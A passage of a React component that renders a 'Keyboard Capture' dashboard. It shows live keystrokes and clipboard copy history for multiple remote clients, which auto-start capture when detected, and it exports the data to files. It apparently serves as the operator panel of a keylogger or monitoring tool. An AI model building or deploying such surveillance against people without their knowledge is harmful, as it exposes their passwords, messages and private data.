      if (e.keyCode === 32) return prev + ' ';
      // Only convert printable ASCII characters
      if (e.keyCode >= 32 && e.keyCode <= 126) {
        let char = String.fromCharCode(e.keyCode);
        // Apply shift
        if (hasShift && char.match(/[a-z]/)) {
          char = char.toUpperCase();
        } else if (!hasShift && char.match(/[A-Z]/)) {
          char = char.toLowerCase();
        }
        return prev + char;
      }
    }
    
    // If we can't identify the key, show the keyCode (but only for non-printable keys)
    if (e.keyCode && e.keyCode !== 255 && !hasKeychar) {
      console.log('Unknown key, showing keyCode:', e.keyCode);
      return prev + `[Key${e.keyCode}]`;
    }
    
    return prev;
  }

  // Get current displayed text based on selected client and active tab
  const getCurrentText = () => {
    const clientId = selectedKeyboardClient || manualClientId || selectedSession;
    console.log('🔍 getCurrentText - clientId:', clientId, 'activeTab:', activeTab);
    console.log('🔍 activeClients keys:', Array.from(activeClients.keys()));
    console.log('🔍 activeClients.has(clientId):', clientId ? activeClients.has(clientId) : false);
    
    if (clientId && activeClients.has(clientId)) {
      const clientData = activeClients.get(clientId);
      console.log('🔍 clientData:', clientData);
      console.log('🔍 copyHistory length:', clientData.copyHistory?.length || 0);
      
      if (activeTab === 'copy') {
        // Return copy history as formatted text
        const copyHistory = clientData.copyHistory || [];
        console.log('🔍 Formatting copy history, entries:', copyHistory.length);
        const formatted = copyHistory.map((entry, index) => 
          `[${new Date(entry.timestamp).toLocaleString()}] ${entry.text}`
        ).join('\n');
        console.log('🔍 Formatted copy history length:', formatted.length);
        return formatted;
      } else {
        return clientData.keyboardText || '';
      }
    }
    console.log('🔍 No client selected or not in activeClients');
    return '';
  };

  // Get copy history for selected client
  const getCopyHistory = () => {
    const clientId = selectedKeyboardClient || manualClientId || selectedSession;
    if (clientId && activeClients.has(clientId)) {
      return activeClients.get(clientId).copyHistory || [];
    }
    return [];
  };

  const currentText = getCurrentText();
  const copyHistory = getCopyHistory();
  const totalActiveClients = Array.from(activeClients.values()).filter(c => c.isCapturing).length;
  
  // Debug logging for copy history display
  useEffect(() => {
    const clientId = selectedKeyboardClient || manualClientId || selectedSession;
    if (clientId && activeClients.has(clientId)) {
      const clientData = activeClients.get(clientId);
      console.log('🔍 useEffect - clientId:', clientId, 'copyHistory length:', clientData.copyHistory?.length || 0);
      console.log('🔍 useEffect - activeTab:', activeTab);
      console.log('🔍 useEffect - currentText length:', currentText.length);
      console.log('🔍 useEffect - copyHistory array:', clientData.copyHistory);
    } else {
      console.log('🔍 useEffect - No client selected or not in activeClients. clientId:', clientId, 'has:', clientId ? activeClients.has(clientId) : false);
    }
  }, [activeClients, selectedKeyboardClient, manualClientId, selectedSession, activeTab, currentText]);
  
  // Debug logging for copy history
  useEffect(() => {
    const clientId = selectedKeyboardClient || manualClientId || selectedSession;
    if (clientId && activeClients.has(clientId)) {
      const clientData = activeClients.get(clientId);
      console.log('🔍 useEffect - clientId:', clientId, 'copyHistory length:', clientData.copyHistory?.length || 0);
      console.log('🔍 useEffect - activeTab:', activeTab);
      console.log('🔍 useEffect - currentText length:', currentText.length);
    }
  }, [activeClients, selectedKeyboardClient, manualClientId, selectedSession, activeTab, currentText]);

  const selectedClientId = selectedKeyboardClient || manualClientId || selectedSession;

  return (
    <div className="card shadow-sm mb-4">
      <div className="card-header">
        <div className="d-flex align-items-center justify-content-between flex-wrap gap-2">
          <div className="d-flex align-items-center">
            <i className="fas fa-keyboard me-2" style={{ fontSize: '1.5rem' }}></i>
            <div>
              <h5 className="mb-0 text-white fw-bold">Keyboard Capture</h5>
              <small className="text-white opacity-75">
                Real-time keyboard and clipboard monitoring
              </small>
            </div>
          </div>
          {totalActiveClients > 0 && (
            <div className="d-flex align-items-center gap-2">
              <span className="badge bg-white text-primary px-3 py-2">
                <span
                  className="spinner-border spinner-border-sm me-2 text-primary"
                  role="status"
                  aria-hidden="true"
                ></span>
                <strong>{totalActiveClients}</strong> client{totalActiveClients !== 1 ? 's' : ''} active
              </span>
            </div>
          )}
        </div>
      </div>
      <div className="card-body">
        {/* Active Clients List */}
        <div className="mb-4">
          <div className="d-flex align-items-center justify-content-between mb-3 flex-wrap gap-2">
            <div>
              <label className="form-label mb-0 fw-bold text-dark">
                <i className="fas fa-desktop me-2 text-primary"></i>
                All Clients ({activeClients.size})
              </label>
              <div className="d-flex align-items-center gap-3 mt-1 flex-wrap">
                <small className="text-muted">
                  <span className="badge bg-success me-1">●</span>
                  Active: {totalActiveClients}
                </small>
                <small className="text-muted">
                  <span className="badge bg-secondary me-1">●</span>
                  Inactive: {activeClients.size - totalActiveClients}
                </small>
                {exportedFiles.length > 0 && (
                  <small className="text-muted">
                    <span className="badge bg-info me-1">
                      <i className="fas fa-file-download"></i>
                    </span>
                    Exported: {exportedFiles.length} file{exportedFiles.length !== 1 ? 's' : ''}
                  </small>
                )}
              </div>
            </div>
            <button
              className="btn btn-sm btn-danger"
              onClick={() => stopCaptureForClient(null)}
              disabled={!connected || totalActiveClients === 0}
              title="Stop all captures"
            >
              <i className="fas fa-stop me-1"></i>
              Stop All
            </button>
          </div>
          {activeClients.size > 0 ? (
            <>
              <div className="d-flex justify-content-end mb-2">
                <div className="form-check form-switch">
                  <input
                    className="form-check-input"
                    type="checkbox"
                    id="showOnlyActive"
                    checked={showOnlyActive}
                    onChange={(e) => setShowOnlyActive(e.target.checked)}
                  />
                  <label className="form-check-label text-muted small" htmlFor="showOnlyActive">
                    <i className="fas fa-filter me-1"></i>
                    Show only active clients
                  </label>
                </div>
              </div>
              <div className="row g-3">
                {Array.from(activeClients.entries())
                  .filter(([clientId, clientData]) => !showOnlyActive || clientData.isCapturing)
                  .map(([clientId, clientData]) => {
                // Try to get client info from current list first, then from cache
                const clientInfo = keyboardClients.find(c => c.clientId === clientId) || clientInfoCacheRef.current.get(clientId);
                const displayName = clientInfo 
                  ? `${clientInfo.label} (${clientInfo.platform}/${clientInfo.arch})` 
                  : clientId;
                const isSelected = selectedClientId === clientId;
                const isCapturing = clientData.isCapturing;
                return (
                  <div key={clientId} className={`col-12 col-md-6 col-lg-4`}>
                    <div 
                      className={`client-card ${isCapturing ? 'capturing' : 'inactive'} ${isSelected ? 'active' : ''}`}
                      onClick={() => {
                        setSelectedKeyboardClient(clientId);
                        setManualClientId('');
                      }}
                    >
                      <div className="d-flex align-items-start justify-content-between mb-2">
                        <div className="flex-grow-1">
                          <div className="d-flex align-items-center mb-2 flex-wrap gap-2">
                            <span className={`status-indicator ${isCapturing ? 'active' : 'inactive'}`}></span>
                            <strong className={`${isCapturing ? 'text-success' : 'text-muted'}`} style={{ fontSize: '1rem' }}>
                              {displayName}
                            </strong>
                            {isCapturing ? (
                              <span className="badge bg-success px-2 py-1">
                                <i className="fas fa-circle-notch fa-spin me-1" style={{ fontSize: '0.7rem' }}></i>
                                ACTIVE
                              </span>
                            ) : (
                              <span className="badge bg-secondary px-2 py-1">
                                <i className="fas fa-pause me-1" style={{ fontSize: '0.7rem' }}></i>
                                INACTIVE
                              </span>
                            )}
                          </div>
                          <div className="d-flex flex-wrap gap-2">
                            <span className={`stats-item ${isCapturing ? '' : 'opacity-50'}`}>
                              <i className={`fas fa-keyboard ${isCapturing ? 'text-success' : 'text-muted'}`}></i>
                              {clientData.keyboardText?.length || 0} chars
                            </span>
                            <span className={`stats-item ${isCapturing ? '' : 'opacity-50'}`}>
                              <i className={`fas fa-copy ${isCapturing ? 'text-success' : 'text-muted'}`}></i>
                              {clientData.copyHistory?.length || 0} copies
                            </span>
                          </div>
                          <small className={`d-block mt-2 ${isCapturing ? 'text-success' : 'text-muted'}`}>
                            <i className={`fas fa-clock me-1 ${isCapturing ? 'text-success' : ''}`}></i>
                            {new Date(clientData.lastUpdate).toLocaleTimeString()}
                          </small>
                        </div>
                        <div className="d-flex flex-column gap-1">
                          <button
                            className="btn btn-sm btn-outline-primary"
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedKeyboardClient(clientId);
                              setManualClientId('');
                            }}
                            title="View this client"
                          >
                            <i className="fas fa-eye"></i>
                          </button>
                          <button
                            className="btn btn-sm btn-outline-warning"
                            onClick={(e) => {
                              e.stopPropagation();
                              stopCaptureForClient(clientId);
                            }}
                            title="Stop capture for this client"
                            disabled={!clientData.isCapturing}
                          >
                            <i className="fas fa-stop"></i>
                          </button>
                          <button
                            className="btn btn-sm btn-outline-danger"
                            onClick={(e) => {
                              e.stopPropagation();
                              removeClient(clientId);
                            }}
                            title="Remove this client completely"
                          >
                            <i className="fas fa-times"></i>
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                );
              })}
              </div>
              {showOnlyActive && Array.from(activeClients.values()).filter(c => c.isCapturing).length === 0 && (
                <div className="text-center py-4 text-muted">
                  <i className="fas fa-info-circle me-2"></i>
                  No active clients at the moment
                </div>
              )}
            </>
          ) : (
            <div className="empty-state">
              <i className="fas fa-desktop"></i>
              <p className="mb-0">No active clients. Clients will auto-start when detected.</p>
            </div>
          )}
        </div>

        {/* Tabs for Keyboard vs Copy view */}
        <div className="mb-4">
          <ul className="nav nav-tabs" role="tablist">
            <li className="nav-item" role="presentation">
              <button
                className={`nav-link ${activeTab === 'keyboard' ? 'active' : ''}`}
                onClick={() => setActiveTab('keyboard')}
                type="button"
              >
                <i className="fas fa-keyboard me-2"></i>
                Keyboard Typing
                {activeTab === 'keyboard' && selectedClientId && (
                  <span className="badge bg-primary ms-2">
                    {activeClients.get(selectedClientId)?.keyboardText?.length || 0}
                  </span>
                )}
              </button>
            </li>
            <li className="nav-item" role="presentation">
              <button
                className={`nav-link ${activeTab === 'copy' ? 'active' : ''}`}
                onClick={() => setActiveTab('copy')}
                type="button"
              >
                <i className="fas fa-copy me-2"></i>
                Copy History
                {copyHistory.length > 0 && (
                  <span className="badge bg-primary ms-2">{copyHistory.length}</span>
                )}
              </button>
            </li>
          </ul>
        </div>

        {/* Keyboard monitoring clients selection */}
        <div className="mb-4">
          <div className="row g-3">
            <div className="col-12 col-md-6">
              <label className="form-label fw-bold text-dark">
                <i className="fas fa-search me-2 text-primary"></i>
                Select Client to View
              </label>
              {keyboardClients.length > 0 ? (
                <select
                  className="form-select"
                  value={selectedKeyboardClient}
                  onChange={(e) => {
                    setSelectedKeyboardClient(e.target.value);
                    setManualClientId('');
                  }}
                >
                  <option value="">Select a keyboard client to view...</option>
                  {keyboardClients.map((client) => (
                    <option key={client.clientId} value={client.clientId}>
                      {client.label} ({client.platform}/{client.arch}) - {client.clientId}
                    </option>
                  ))}
                </select>
              ) : (
                <div className="alert alert-info mb-0 py-2">
                  <i className="fas fa-info-circle me-2"></i>
                  No keyboard monitoring clients connected
                </div>
              )}
            </div>
            <div className="col-12 col-md-6">
              <label className="form-label fw-bold text-dark">
                <i className="fas fa-key me-2 text-primary"></i>
                Or Enter Client ID Manually
              </label>
              <input
                type="text"
                className="form-control"
                placeholder="Enter keyboard client ID"
                value={manualClientId}
                onChange={(e) => {
                  setManualClientId(e.target.value);
                  setSelectedKeyboardClient('');
                }}
              />
            </div>
          </div>
        </div>

        {/* Action buttons */}
        {selectedClientId && (
          <div className="mb-3 d-flex justify-content-end gap-2 flex-wrap">
            <button
              className="btn btn-outline-primary"
              onClick={() => {
                if (selectedClientId && activeClients.has(selectedClientId)) {
                  const clientData = activeClients.get(selectedClientId);
                  const clientInfo = keyboardClients.find(c => c.clientId === selectedClientId) || clientInfoCacheRef.current.get(selectedClientId);
                  exportClientDataToFile(selectedClientId, clientData, clientInfo);
                }
              }}
              disabled={!selectedClientId || !activeClients.has(selectedClientId)}
              title="Export this client's data to a text file"
            >
              <i className="fas fa-download me-2"></i>
              Export to File
            </button>
            <button
              className="btn btn-secondary"
              onClick={() => {
                if (selectedClientId) {
                  setActiveClients((prev) => {
                    const newMap = new Map(prev);
                    if (newMap.has(selectedClientId)) {
                      const clientData = newMap.get(selectedClientId);
                      if (activeTab === 'copy') {
                        // Clear copy history
                        newMap.set(selectedClientId, { ...clientData, copyHistory: [] });
                        copyHistoryRef.current.set(selectedClientId, []);
                      } else {
                        // Clear keyboard text
                        newMap.set(selectedClientId, { ...clientData, keyboardText: '' });
                        textHistoryRef.current.set(selectedClientId, '');
                      }
                    }
                    return newMap;
                  });
                }
              }}
              disabled={!currentText}
              title={`Clear ${activeTab === 'copy' ? 'copy history' : 'keyboard text'} for selected client`}
            >
              <i className="fas fa-eraser me-2"></i>
              Clear {activeTab === 'copy' ? 'Copy History' : 'Keyboard Text'}
            </button>
          </div>
        )}

        {/* Content display */}
        {selectedClientId ? (
          <textarea
            readOnly
            value={currentText}
            rows={18}
            className="form-control font-monospace"
            style={{
              fontSize: '14px',
              lineHeight: '1.7',
              backgroundColor: '#f8fafc',
              resize: 'vertical',
              minHeight: '400px'
            }}
            placeholder={
              activeTab === 'copy'
                ? 'Copy history will appear here...'
                : 'Keyboard typing will appear here...'
            }
          />
        ) : (
          <div className="empty-state" style={{ minHeight: '400px', display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
            <i className={`fas ${activeTab === 'copy' ? 'fa-copy' : 'fa-keyboard'}`}></i>
            <h6 className="mt-3 mb-2">No Client Selected</h6>
            <p className="text-muted mb-0">
              {totalActiveClients > 0
                ? `Select a client above to view its ${activeTab === 'copy' ? 'copy history' : 'keyboard typing'}...`
                : 'Clients will automatically start capturing when detected...'}
            </p>
          </div>
        )}
        {/* Exported Files Section */}
        {exportedFiles.length > 0 && (
          <div className="mt-4">
            <div className="card border-info">
              <div className="card-header bg-info text-white">
                <i className="fas fa-file-download me-2"></i>
                Exported Files ({exportedFiles.length})
              </div>
              <div className="card-body">
                <div className="list-group list-group-flush">
                  {exportedFiles.slice().reverse().map((file, index) => (
                    <div key={index} className="list-group-item px-0 py-2 border-bottom">
                      <div className="d-flex align-items-center justify-content-between">
                        <div className="flex-grow-1">
                          <div className="d-flex align-items-center mb-1">
                            <i className="fas fa-file-text text-info me-2"></i>
                            <strong className="text-dark">{file.fileName}</strong>
                          </div>
                          <small className="text-muted d-block">
                            <i className="fas fa-desktop me-1"></i>
                            {file.clientName} ({file.clientId.substring(0, 8)}...)
                          </small>
                          <small className="text-muted d-block">
                            <i className="fas fa-clock me-1"></i>
                            {new Date(file.exportDate).toLocaleString()}
                          </small>
                          <small className="text-muted d-block">
                            <i className="fas fa-keyboard me-1"></i>
                            {file.keyboardTextLength.toLocaleString()} chars, 
                            <i className="fas fa-copy ms-2 me-1"></i>
                            {file.copyHistoryCount} copies
                          </small>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
                <div className="mt-3">
                  <small className="text-muted">
                    <i className="fas fa-info-circle me-1"></i>
                    Files are automatically exported when data exceeds 2MB per client. 
                    Check your browser's download folder.
                  </small>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Debug info */}
        {process.env.NODE_ENV === 'development' && (
          <div className="mt-2 small text-muted">
            Debug: Active clients: {activeClients.size}, Capturing: {totalActiveClients}, 
            Selected: {selectedKeyboardClient || manualClientId || selectedSession || 'None'}
          </div>
        )}
      </div>
    </div>
  );
};

export default KeyboardCapture;
